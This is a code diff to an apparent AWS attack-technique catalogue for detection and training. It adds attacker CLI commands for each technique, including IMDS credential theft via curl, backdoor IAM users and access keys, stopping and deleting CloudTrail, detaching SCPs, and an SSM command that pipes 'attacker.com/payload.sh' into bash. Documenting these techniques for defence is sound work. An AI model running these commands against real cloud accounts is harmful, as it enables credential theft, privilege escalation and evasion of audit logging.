@@ -16,6 +16,8 @@ export interface Technique {
   category: TechniqueCategory;
   /** Example CloudTrail log event for this technique */
   cloudtrailSample?: string;
+  /** Example AWS CLI commands or API calls used to execute this technique */
+  commands?: string[];
   /** Attribution to sources (Hacking the Cloud, CloudGoat, etc.) */
   references?: Array<{ source: string; url?: string }>;
 }
@@ -45,7 +47,7 @@ export const techniques: Technique[] = [
     name: "EC2 IMDS Credential Theft",
     shortName: "IMDS Theft",
     description:
-      "Access the EC2 Instance Metadata Service (IMDS) to steal temporary IAM role credentials attached to the instance. IMDSv1 is especially vulnerable to SSRF attacks that allow remote credential extraction.",
+      "The EC2 Instance Metadata Service (IMDS) provides temporary IAM role credentials to any process running on the instance. An attacker with code execution on the instance (via RCE, SSRF, or compromised application) can query the metadata endpoint at http://169.254.169.254/latest/meta-data/iam/security-credentials/ to retrieve access keys, secret key, and session token. IMDSv1 uses a simple HTTP GET and is vulnerable to SSRF from web applications. No AWS permissions are required; the attacker only needs network access to the metadata endpoint from within the instance.",
     services: ["EC2", "IAM"],
     permissions: [],
     detectionIds: ["det-014", "det-015"],
@@ -55,6 +57,10 @@ export const techniques: Technique[] = [
       "Use VPC endpoints to restrict metadata access",
     ],
     category: "credential-access",
+    commands: [
+      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -78,7 +84,7 @@ export const techniques: Technique[] = [
     name: "IAM PassRole Abuse",
     shortName: "PassRole",
     description:
-      "Exploit iam:PassRole to pass a high-privilege IAM role to an AWS service (Lambda, EC2, Glue). The attacker then executes code through that service using the escalated role's permissions.",
+      "When creating or configuring AWS resources like Lambda functions, EC2 instances, or Glue dev endpoints, the caller must have iam:PassRole permission to assign an IAM role to that resource. An attacker with iam:PassRole and a service-specific create permission (e.g., lambda:CreateFunction) can pass a high-privilege role to a new resource they control. The resource then runs with that role's permissions, effectively escalating the attacker's access. The attacker creates a Lambda with an admin role, invokes it, and the Lambda code runs with full admin rights. Required permissions include iam:PassRole plus the service action (lambda:CreateFunction, ec2:RunInstances, glue:CreateDevEndpoint, etc.).",
     services: ["IAM", "Lambda", "EC2"],
     permissions: ["iam:PassRole"],
     detectionIds: ["det-001", "det-012"],
@@ -88,6 +94,10 @@ export const techniques: Technique[] = [
       "Use SCPs to limit which roles can be passed",
     ],
     category: "privilege-escalation",
+    commands: [
+      "aws lambda create-function --function-name backdoor --runtime python3.12 --handler index.handler --role arn:aws:iam::ACCOUNT:role/AdminRole --code S3Bucket=bucket,S3Key=code.zip",
+      "aws lambda invoke --function-name backdoor output.json",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -118,7 +128,7 @@ export const techniques: Technique[] = [
     name: "STS AssumeRole Abuse",
     shortName: "AssumeRole",
     description:
-      "Abuse overly permissive IAM trust policies to assume roles within the same account or across accounts. This provides temporary credentials with the assumed role's permissions.",
+      "IAM roles define which principals can assume them via a trust policy. If a trust policy is overly permissive (e.g., allows any principal in the account or a wide range of external accounts), an attacker with valid credentials can call sts:AssumeRole to obtain temporary credentials scoped to that role. This enables lateral movement within an account or cross-account access. The attacker uses the assumed role's credentials to perform actions with elevated permissions. Required permission is sts:AssumeRole. The role's trust policy must allow the attacker's principal.",
     services: ["STS", "IAM"],
     permissions: ["sts:AssumeRole"],
     detectionIds: ["det-004"],
@@ -128,6 +138,10 @@ export const techniques: Technique[] = [
       "Audit trust policies regularly",
     ],
     category: "lateral-movement",
+    commands: [
+      "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/TargetRole --role-session-name attacker-session",
+      "aws sts get-caller-identity (with assumed role credentials)",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -161,7 +175,7 @@ export const techniques: Technique[] = [
     name: "Create Policy Version Escalation",
     shortName: "PolicyVersion",
     description:
-      "Overwrite an existing managed IAM policy by creating a new version with elevated permissions (e.g., Action: *, Resource: *) and setting it as default.",
+      "IAM managed policies support multiple versions. An attacker with iam:CreatePolicyVersion can create a new version of a policy they are attached to, replacing the policy document with one that grants broader permissions (e.g., Action: *, Resource: *). By setting setAsDefault to true, the new version becomes active immediately. The attacker's existing attachment to the policy now grants the escalated permissions without any additional API calls. Required permission is iam:CreatePolicyVersion on the target policy.",
     services: ["IAM"],
     permissions: ["iam:CreatePolicyVersion"],
     detectionIds: ["det-011", "det-004"],
@@ -171,6 +185,9 @@ export const techniques: Technique[] = [
       "Enable AWS Config rules for policy compliance",
     ],
     category: "privilege-escalation",
+    commands: [
+      "aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/DevPolicy --policy-document file://malicious-policy.json --set-as-default",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -199,7 +216,7 @@ export const techniques: Technique[] = [
     name: "IAM Policy Attachment",
     shortName: "AttachPolicy",
     description:
-      "Attach a managed or inline policy directly to an IAM user or role to grant additional permissions. Commonly used for privilege escalation when iam:AttachUserPolicy or iam:PutUserPolicy is available.",
+      "An attacker with iam:AttachUserPolicy, iam:PutUserPolicy, or iam:AttachRolePolicy can grant additional permissions to themselves or to a role they control. Attaching a managed policy like AdministratorAccess or a custom inline policy with broad permissions immediately escalates privileges. The attacker can attach policies to their own user, to roles they can assume, or to other principals if they have the corresponding attach permission. Required permissions include iam:AttachUserPolicy (for managed policies on users), iam:PutUserPolicy (for inline policies on users), or iam:AttachRolePolicy (for roles).",
     services: ["IAM"],
     permissions: ["iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:AttachRolePolicy"],
     detectionIds: ["det-004"],
@@ -209,6 +226,10 @@ export const techniques: Technique[] = [
       "Implement permission boundaries",
     ],
     category: "privilege-escalation",
+    commands: [
+      "aws iam attach-user-policy --user-name compromised-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+      "aws iam put-user-policy --user-name compromised-user --policy-name BackdoorPolicy --policy-document file://policy.json",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -233,7 +254,7 @@ export const techniques: Technique[] = [
     name: "Lambda Function Code Execution",
     shortName: "Lambda Exec",
     description:
-      "Create and invoke a Lambda function to execute arbitrary code in the cloud environment. Combined with PassRole, this allows code to run with the permissions of any role the attacker can pass.",
+      "An attacker with lambda:CreateFunction and iam:PassRole can deploy a Lambda function that runs arbitrary code with the permissions of a passed IAM role. The attacker uploads malicious code (e.g., via inline zip or S3), assigns a high-privilege role, and invokes the function. The Lambda executes in AWS's environment with the role's credentials, allowing the attacker to perform any action the role permits, such as creating backdoor users or exfiltrating data. Required permissions are lambda:CreateFunction, lambda:InvokeFunction, and iam:PassRole for the execution role.",
     services: ["Lambda", "IAM"],
     permissions: ["lambda:CreateFunction", "lambda:InvokeFunction"],
     detectionIds: ["det-005", "det-012"],
@@ -243,6 +264,10 @@ export const techniques: Technique[] = [
       "Audit Lambda functions and their associated roles",
     ],
     category: "privilege-escalation",
+    commands: [
+      "aws lambda create-function --function-name backdoor --runtime python3.12 --handler index.handler --role arn:aws:iam::ACCOUNT:role/AdminRole --zip-file fileb://payload.zip",
+      "aws lambda invoke --function-name backdoor --payload '{}' output.json",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -268,7 +293,7 @@ export const techniques: Technique[] = [
     name: "S3 Data Exfiltration",
     shortName: "S3 Exfil",
     description:
-      "Download sensitive data from S3 buckets using compromised credentials, pre-signed URLs, or cross-account replication. High-volume GetObject calls are a key indicator.",
+      "An attacker with s3:GetObject and s3:ListBucket can download objects from S3 buckets. After obtaining credentials (via IMDS, stolen keys, or assumed roles), the attacker lists bucket contents and downloads sensitive objects. High-volume or unusual GetObject patterns are indicators of exfiltration. Required permissions are s3:GetObject to retrieve objects and s3:ListBucket to enumerate bucket contents. Cross-account access may also be achieved via bucket policies that grant access to external principals.",
     services: ["S3", "IAM"],
     permissions: ["s3:GetObject", "s3:ListBucket"],
     detectionIds: ["det-003", "det-017", "det-018"],
@@ -278,6 +303,10 @@ export const techniques: Technique[] = [
       "Implement S3 Block Public Access at the account level",
     ],
     category: "exfiltration",
+    commands: [
+      "aws s3 ls s3://target-bucket/",
+      "aws s3 cp s3://target-bucket/sensitive-file.csv . --recursive",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -306,7 +335,7 @@ export const techniques: Technique[] = [
     name: "Backdoor IAM User Creation",
     shortName: "Create User",
     description:
-      "Create a new IAM user with a non-obvious name and attach administrative policies. This provides persistent access even after the original compromise vector is remediated.",
+      "An attacker with iam:CreateUser and iam:PutUserPolicy (or iam:AttachUserPolicy) can create a new IAM user with a low-profile name (e.g., svc-cloudwatch-metrics) and attach administrative policies. This establishes persistent access that survives key rotation or remediation of the original compromise. The attacker later creates access keys for the backdoor user. Required permissions are iam:CreateUser and either iam:PutUserPolicy for inline policies or iam:AttachUserPolicy for managed policies.",
     services: ["IAM"],
     permissions: ["iam:CreateUser", "iam:PutUserPolicy"],
     detectionIds: ["det-004", "det-010"],
@@ -316,6 +345,10 @@ export const techniques: Technique[] = [
       "Implement alerting on any IAM changes",
     ],
     category: "persistence",
+    commands: [
+      "aws iam create-user --user-name svc-cloudwatch-metrics",
+      "aws iam put-user-policy --user-name svc-cloudwatch-metrics --policy-name AdminAccess --policy-document file://admin-policy.json",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -346,7 +379,7 @@ export const techniques: Technique[] = [
     name: "Access Key Generation",
     shortName: "Access Keys",
     description:
-      "Generate long-lived IAM access keys for programmatic access. Attackers create keys on backdoor users or compromised accounts to maintain persistent re-entry.",
+      "An attacker with iam:CreateAccessKey can generate long-lived access keys for an IAM user they control or have compromised. Unlike temporary credentials from STS, access keys do not expire and provide persistent programmatic access. Attackers create keys on backdoor users to maintain access after the initial compromise is remediated. Required permission is iam:CreateAccessKey. The attacker must have access to the target user (e.g., created it or compromised it).",
     services: ["IAM"],
     permissions: ["iam:CreateAccessKey"],
     detectionIds: ["det-010"],
@@ -356,6 +389,9 @@ export const techniques: Technique[] = [
       "Use temporary credentials (STS) instead of long-lived keys",
     ],
     category: "persistence",
+    commands: [
+      "aws iam create-access-key --user-name backdoor-user",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -386,7 +422,7 @@ export const techniques: Technique[] = [
     name: "Lambda Persistence via Event Triggers",
     shortName: "Lambda Trigger",
     description:
-      "Establish persistent access by configuring CloudWatch Events rules, S3 event notifications, or DynamoDB Streams to automatically trigger a backdoor Lambda function.",
+      "An attacker configures automated triggers so a backdoor Lambda function runs on a schedule or in response to events. Using events:PutRule and events:PutTargets, they create an EventBridge rule (e.g., rate(5 minutes)) that invokes the Lambda. Alternatively, lambda:CreateEventSourceMapping can attach S3, DynamoDB Streams, or other event sources. The Lambda executes periodically or on trigger without further attacker action. Required permissions include events:PutRule, events:PutTargets, and lambda:AddPermission (to allow EventBridge to invoke the Lambda).",
     services: ["Lambda", "CloudTrail", "S3", "DynamoDB"],
     permissions: ["events:PutRule", "events:PutTargets", "lambda:CreateEventSourceMapping"],
     detectionIds: ["det-005", "det-013"],
@@ -396,6 +432,10 @@ export const techniques: Technique[] = [
       "Audit event source mappings regularly",
     ],
     category: "persistence",
+    commands: [
+      "aws events put-rule --name scheduled-backdoor --schedule-expression 'rate(5 minutes)' --state ENABLED",
+      "aws events put-targets --rule scheduled-backdoor --targets Id=1,Arn=arn:aws:lambda:REGION:ACCOUNT:function:backdoor",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -424,7 +464,7 @@ export const techniques: Technique[] = [
     name: "CloudTrail Logging Disruption",
     shortName: "Disable Logs",
     description:
-      "Stop or delete CloudTrail trails to eliminate audit logging. This is a critical defense evasion technique that blinds the security team to subsequent attacker activity.",
+      "An attacker with cloudtrail:StopLogging or cloudtrail:DeleteTrail can halt or remove CloudTrail trails, eliminating audit logging of API activity. StopLogging immediately stops delivery of events to the trail's S3 bucket. DeleteTrail removes the trail configuration entirely. This blinds security monitoring to subsequent attacker actions. Required permissions are cloudtrail:StopLogging to pause a trail or cloudtrail:DeleteTrail to remove it.",
     services: ["CloudTrail", "IAM"],
     permissions: ["cloudtrail:StopLogging", "cloudtrail:DeleteTrail"],
     detectionIds: ["det-002"],
@@ -434,6 +474,10 @@ export const techniques: Technique[] = [
       "Set up real-time alerting on trail changes",
     ],
     category: "defense-evasion",
+    commands: [
+      "aws cloudtrail stop-logging --name management-trail",
+      "aws cloudtrail delete-trail --name management-trail",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -458,7 +502,7 @@ export const techniques: Technique[] = [
     name: "S3 Bucket Policy Modification",
     shortName: "Bucket Policy",
     description:
-      "Modify or delete S3 bucket policies to grant unauthorized access, expose data publicly, or enable cross-account replication to attacker-controlled buckets.",
+      "An attacker with s3:PutBucketPolicy can modify a bucket's resource policy to grant access to external principals (e.g., attacker account root) or make objects publicly readable. s3:DeleteBucketPolicy removes existing restrictions. s3:PutBucketReplication can configure replication to an attacker-controlled bucket for exfiltration. Required permissions are s3:PutBucketPolicy, s3:DeleteBucketPolicy, or s3:PutBucketReplication depending on the attack variant.",
     services: ["S3", "IAM"],
     permissions: ["s3:PutBucketPolicy", "s3:DeleteBucketPolicy", "s3:PutBucketReplication"],
     detectionIds: ["det-017", "det-018"],
@@ -468,6 +512,10 @@ export const techniques: Technique[] = [
       "Monitor bucket policy changes via CloudTrail",
     ],
     category: "exfiltration",
+    commands: [
+      "aws s3api put-bucket-policy --bucket target-bucket --policy file://malicious-policy.json",
+      "aws s3api delete-bucket-policy --bucket target-bucket",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -500,7 +548,7 @@ export const techniques: Technique[] = [
     name: "ECS Task Definition Modification",
     shortName: "ECS Hijack",
     description:
-      "Register a new ECS task definition revision with a malicious container image or modified entrypoint. When the service deploys, the attacker's code runs with the task role's permissions.",
+      "An attacker with ecs:RegisterTaskDefinition can create a new task definition revision that uses a malicious container image or modified entrypoint. When ecs:UpdateService is called to deploy the new revision, the attacker's code runs in the cluster with the task role's permissions. The attacker can exfiltrate credentials, access other AWS resources, or establish persistence. Required permissions are ecs:RegisterTaskDefinition and ecs:UpdateService. The task role may have broad permissions if not properly scoped.",
     services: ["ECS", "IAM"],
     permissions: ["ecs:RegisterTaskDefinition", "ecs:UpdateService"],
     detectionIds: ["det-027"],
@@ -510,6 +558,10 @@ export const techniques: Technique[] = [
       "Audit task definition revisions regularly",
     ],
     category: "privilege-escalation",
+    commands: [
+      "aws ecs register-task-definition --family web-app --container-definitions '[{\"name\":\"app\",\"image\":\"attacker-registry/backdoor:latest\",\"essential\":true}]' --task-role-arn arn:aws:iam::ACCOUNT:role/ECSTaskRole",
+      "aws ecs update-service --cluster prod --service web-app --task-definition web-app:N",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -537,7 +589,7 @@ export const techniques: Technique[] = [
     name: "EKS RBAC Privilege Escalation",
     shortName: "EKS RBAC",
     description:
-      "Abuse Kubernetes RBAC in EKS to escalate privileges by creating ClusterRoleBindings or modifying existing roles to grant cluster-admin access to an attacker-controlled service account.",
+      "An attacker with access to the EKS Kubernetes API (via eks:AccessKubernetesApi or kubectl with valid credentials) can abuse RBAC to escalate privileges. By creating a ClusterRoleBinding that grants cluster-admin to their service account or user, they gain full control of the cluster. This is performed via kubectl or the Kubernetes API, not AWS APIs directly. Required access includes valid EKS credentials (e.g., from aws-auth ConfigMap or IAM role for service account) and permissions to create or modify RoleBindings and ClusterRoleBindings.",
     services: ["EKS", "IAM"],
     permissions: ["eks:AccessKubernetesApi"],
     detectionIds: ["det-025", "det-026"],
@@ -547,6 +599,10 @@ export const techniques: Technique[] = [
       "Restrict cluster-admin bindings via OPA/Gatekeeper",
     ],
     category: "privilege-escalation",
+    commands: [
+      "kubectl create clusterrolebinding attacker-admin --clusterrole=cluster-admin --serviceaccount=default:attacker-sa",
+      "kubectl auth can-i --list (to enumerate permissions)",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -570,7 +626,7 @@ export const techniques: Technique[] = [
     name: "Secrets Manager Secret Extraction",
     shortName: "Secrets Theft",
     description:
-      "Retrieve secrets from AWS Secrets Manager using GetSecretValue. Attackers target database credentials, API keys, and tokens stored as secrets after gaining IAM access.",
+      "An attacker with secretsmanager:GetSecretValue can retrieve the plaintext value of secrets stored in AWS Secrets Manager. secretsmanager:ListSecrets enumerates available secrets. Attackers target database credentials, API keys, and other sensitive values. Required permissions are secretsmanager:GetSecretValue to retrieve a secret and secretsmanager:ListSecrets to discover secrets. Resource-based policies on secrets may further restrict access.",
     services: ["Secrets Manager", "IAM"],
     permissions: ["secretsmanager:GetSecretValue", "secretsmanager:ListSecrets"],
     detectionIds: ["det-028"],
@@ -580,6 +636,10 @@ export const techniques: Technique[] = [
       "Rotate secrets automatically on a schedule",
     ],
     category: "credential-access",
+    commands: [
+      "aws secretsmanager list-secrets",
+      "aws secretsmanager get-secret-value --secret-id prod/database/admin-credentials",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -602,7 +662,7 @@ export const techniques: Technique[] = [
     name: "SSM Run Command Lateral Movement",
     shortName: "SSM RunCmd",
     description:
-      "Use AWS Systems Manager Run Command to execute arbitrary commands on EC2 instances. This allows lateral movement across instances without SSH access or security group changes.",
+      "An attacker with ssm:SendCommand can execute arbitrary commands on EC2 instances that have the SSM agent installed and an appropriate IAM instance profile. This enables lateral movement without SSH keys or opening port 22. ssm:StartSession provides interactive shell access via Session Manager. Instances must be registered with SSM (in managed instance inventory). Required permissions are ssm:SendCommand for Run Command or ssm:StartSession for interactive sessions.",
     services: ["SSM", "EC2", "IAM"],
     permissions: ["ssm:SendCommand", "ssm:StartSession"],
     detectionIds: ["det-029"],
@@ -612,6 +672,10 @@ export const techniques: Technique[] = [
       "Implement approval workflows for Run Command",
     ],
     category: "lateral-movement",
+    commands: [
+      "aws ssm send-command --document-name AWS-RunShellScript --instance-ids i-0abc123 --parameters 'commands=[\"curl http://attacker.com/payload.sh | bash\"]'",
+      "aws ssm start-session --target i-0abc123",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -637,7 +701,7 @@ export const techniques: Technique[] = [
     name: "Organizations SCP Modification",
     shortName: "SCP Bypass",
     description:
-      "Modify or detach Service Control Policies (SCPs) in AWS Organizations to remove security guardrails. This enables previously blocked actions across all accounts in the organization.",
+      "An attacker with organizations:DetachPolicy, organizations:UpdatePolicy, or organizations:DeletePolicy in the management account can remove or weaken Service Control Policies (SCPs). SCPs apply guardrails to member accounts; removing them enables previously blocked actions (e.g., disabling CloudTrail, creating unrestricted IAM users) across the organization. Required permissions are in the management account: organizations:DetachPolicy to detach an SCP from an OU or account, or organizations:UpdatePolicy to modify the policy document.",
     services: ["Organizations", "IAM"],
     permissions: ["organizations:DetachPolicy", "organizations:UpdatePolicy", "organizations:DeletePolicy"],
     detectionIds: ["det-030"],
@@ -647,6 +711,10 @@ export const techniques: Technique[] = [
       "Implement break-glass procedures for SCP changes",
     ],
     category: "defense-evasion",
+    commands: [
+      "aws organizations detach-policy --policy-id p-abcdef --target-id ou-root-xyz",
+      "aws organizations update-policy --policy-id p-abcdef --content file://weakened-scp.json",
+    ],
     cloudtrailSample: `{
   "eventVersion": "1.08",
   "userIdentity": {
@@ -669,23 +737,33 @@ export const techniques: Technique[] = [
     id: "tech-trust-policy-modification",
     name: "IAM Trust Policy Modification",
     shortName: "Trust Mod",
-    description: "Modify IAM role trust policies to add attacker principals (e.g., external account root) as trusted entities, enabling cross-account or backdoor access.",
+    description:
+      "An attacker with iam:UpdateAssumeRolePolicy can modify a role's trust policy to add their own principal (e.g., attacker account root or a user they control) as a trusted entity. Once the trust policy allows the attacker's principal, they can call sts:AssumeRole to obtain temporary credentials for that role. This enables backdoor access or cross-account privilege escalation. Required permission is iam:UpdateAssumeRolePolicy on the target role.",
     services: ["IAM"],
     permissions: ["iam:UpdateAssumeRolePolicy"],
     detectionIds: ["det-004"],
     mitigations: ["Audit trust policy changes", "Use SCPs to restrict AssumeRolePolicy modifications", "Require ExternalId for cross-account trust"],
     category: "privilege-escalation",
+    commands: [
+      "aws iam update-assume-role-policy --role-name TargetRole --policy-document file://backdoor-trust.json",
+      "aws sts assume-role --role-arn arn:aws:iam::TARGET:role/TargetRole --role-session-name backdoor",
+    ],
   },
   {
     id: "tech-inline-policy-injection",
     name: "IAM Inline Policy Injection",
     shortName: "Inline Policy",
-    description: "Add inline policies to roles or users with elevated permissions, bypassing managed policy restrictions.",
+    description:
+      "An attacker with iam:PutRolePolicy or iam:PutUserPolicy can attach an inline policy directly to a role or user. Inline policies are embedded in the principal and can grant broad permissions (e.g., Action: *, Resource: *), bypassing restrictions that might apply to managed policies. The attacker targets principals they control or can assume. Required permissions are iam:PutRolePolicy for roles or iam:PutUserPolicy for users.",
     services: ["IAM"],
     permissions: ["iam:PutRolePolicy", "iam:PutUserPolicy"],
     detectionIds: [],
     mitigations: ["Restrict PutRolePolicy/PutUserPolicy", "Use permission boundaries", "Monitor inline policy changes"],
     category: "privilege-escalation",
+    commands: [
+      "aws iam put-role-policy --role-name TargetRole --policy-name EscalationPolicy --policy-document file://policy.json",
+      "aws iam put-user-policy --user-name TargetUser --policy-name EscalationPolicy --policy-document file://policy.json",
+    ],
   },
   {
     id: "tech-set-default-policy-version",
@@ -922,12 +1000,17 @@ export const techniques: Technique[] = [
     id: "tech-external-imds-ssrf",
     name: "External IMDS SSRF (No Credentials)",
     shortName: "IMDS SSRF",
-    description: "Exploit SSRF in a publicly accessible web app to reach EC2 IMDS and steal instance role credentials without any prior AWS credentials.",
+    description:
+      "A web application vulnerable to Server-Side Request Forgery (SSRF) can be tricked into making HTTP requests to the EC2 Instance Metadata Service at 169.254.169.254. If the app runs on EC2 and uses IMDSv1, an attacker can inject a URL that causes the server to fetch its own IAM role credentials and return them in the response. No AWS credentials are required; the attacker only needs to find an SSRF vulnerability in a publicly accessible app. The attacker crafts a request (e.g., via a callback URL or image src) pointing to the metadata endpoint.",
     services: ["EC2", "IAM"],
     permissions: [],
     detectionIds: [],
     mitigations: ["Enforce IMDSv2", "Fix SSRF vulnerabilities", "Use VPC endpoints for metadata"],
     category: "credential-access",
+    commands: [
+      "Inject URL in vulnerable parameter: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "Or: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
+    ],
     references: [
       { source: "Hacking the Cloud", url: "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/" },
       { source: "CloudGoat", url: "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/cloud_breach_s3.md" },
